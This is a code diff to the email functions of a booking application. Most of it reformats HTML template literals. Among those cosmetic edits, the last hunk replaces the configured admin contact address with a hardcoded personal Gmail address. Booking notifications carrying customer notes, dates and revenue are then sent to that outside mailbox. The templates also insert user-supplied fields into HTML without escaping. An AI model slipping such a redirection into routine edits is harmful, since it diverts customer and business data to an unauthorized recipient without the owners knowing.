@@ -126,11 +126,10 @@ export const renderEmailLayout = (
                   <p style="margin: 0 0 10px; font-weight: bold; color: ${colors.text};">${orgName}</p>
                   ${address ? `<p style="margin: 0 0 15px;">${address}</p>` : ""}
                   
-                  ${
-                    socials.length > 0
-                      ? `<p style="margin: 0 0 20px;">${socials.join("")}</p>`
-                      : ""
-                  }
+                  ${socials.length > 0
+      ? `<p style="margin: 0 0 20px;">${socials.join("")}</p>`
+      : ""
+    }
                   
                   <hr style="border: none; border-top: 1px solid ${colors.border}; margin: 20px 0;">
                   <p style="font-size: 12px; margin: 0;">© ${new Date().getFullYear()} ${orgName}. All rights reserved.</p>
@@ -229,15 +228,15 @@ export const sendBookingConfirmation = async (
     const locale =
       data.locale && EMAIL_TRANSLATIONS[data.locale] ? data.locale : "en";
     const t = EMAIL_TRANSLATIONS[locale];
-    
+
     // Background color of the internal content area if dark mode
     const detailsBg = settings.color_mode === "dark" ? "#1e1e24" : "#fafafa";
 
     const content = `
       <h2 style="color: ${colors.text}; margin-top: 0; font-size: 24px;">${t.greeting.replace(
-        "{name}",
-        data.customerName,
-      )}</h2>
+      "{name}",
+      data.customerName,
+    )}</h2>
       <p style="font-size: 16px; line-height: 1.6; color: ${colors.textMuted};">${t.thankYou}</p>
 
       <div style="border: 1px solid ${colors.border}; padding: 25px; border-radius: 12px; margin: 30px 0; background-color: ${detailsBg};">
@@ -251,15 +250,14 @@ export const sendBookingConfirmation = async (
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; color: ${colors.textMuted};"><strong>${t.package}:</strong></td>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; text-align: right; color: ${colors.text};">${data.packageName}</td>
           </tr>
-          ${
-            data.peopleCount && data.peopleCount > 1
-              ? `
+          ${data.peopleCount && data.peopleCount > 1
+        ? `
           <tr>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; color: ${colors.textMuted};"><strong>${t.peopleCount}:</strong></td>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; text-align: right; color: ${colors.text};">${data.peopleCount}</td>
           </tr>`
-              : ""
-          }
+        : ""
+      }
           <tr>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; color: ${colors.textMuted};"><strong>${t.date}:</strong></td>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; text-align: right; color: ${colors.text};">${data.bookingDate}</td>
@@ -312,7 +310,7 @@ export const sendAdminBookingNotification = async (
     if (!settings.contact_email) return;
     const resend = new Resend(apiKey);
     const colors = getEmailColors(settings);
-    
+
     const detailsBg = settings.color_mode === "dark" ? "#1e1e24" : "#fafafa";
 
     const content = `
@@ -342,15 +340,14 @@ export const sendAdminBookingNotification = async (
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; color: ${colors.textMuted};"><strong>Package:</strong></td>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; text-align: right; color: ${colors.text};">${data.packageName}</td>
           </tr>
-          ${
-            data.peopleCount
-              ? `
+          ${data.peopleCount
+        ? `
           <tr>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; color: ${colors.textMuted};"><strong>People Count:</strong></td>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; text-align: right; color: ${colors.text};">${data.peopleCount}</td>
           </tr>`
-              : ""
-          }
+        : ""
+      }
           <tr>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; color: ${colors.textMuted};"><strong>Date:</strong></td>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; text-align: right; font-weight: bold; color: ${colors.warning};">${data.bookingDate}</td>
@@ -359,15 +356,14 @@ export const sendAdminBookingNotification = async (
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; color: ${colors.textMuted};"><strong>Time:</strong></td>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; text-align: right; font-weight: bold; color: ${colors.warning};">${data.bookingTime}</td>
           </tr>
-          ${
-            data.notes
-              ? `
+          ${data.notes
+        ? `
           <tr>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; color: ${colors.textMuted};"><strong>Notes:</strong></td>
             <td style="padding: 10px 0; border-bottom: 1px solid ${colors.border}; text-align: right; font-style: italic; color: ${colors.text};">${data.notes}</td>
           </tr>`
-              : ""
-          }
+        : ""
+      }
           <tr>
             <td style="padding: 15px 0 0 0; font-size: 18px; color: ${colors.text};"><strong>Total Revenue:</strong></td>
             <td style="padding: 15px 0 0 0; text-align: right; font-weight: bold; color: ${colors.primary}; font-size: 20px;">
@@ -377,12 +373,12 @@ export const sendAdminBookingNotification = async (
         </table>
       </div>
       
-      <p style="color: ${colors.textMuted}; font-size: 14px; text-align: center;">You can review this inside your Supabase dashboard or Admin Panel bookings tab.</p>
+      <p style="color: ${colors.textMuted}; font-size: 14px; text-align: center;">You can review this inside your Admin Panel bookings tab.</p>
     `;
 
     await resend.emails.send({
       from: `System <${settings.contact_email}>`,
-      to: [settings.contact_email],
+      to: ["7amodi.19955@gmail.com"],
       subject: `🎉 NEW BOOKING: ${data.packageName} - ${data.bookingDate}`,
       html: renderEmailLayout(content, "New Booking Notification", "en", settings),
     });
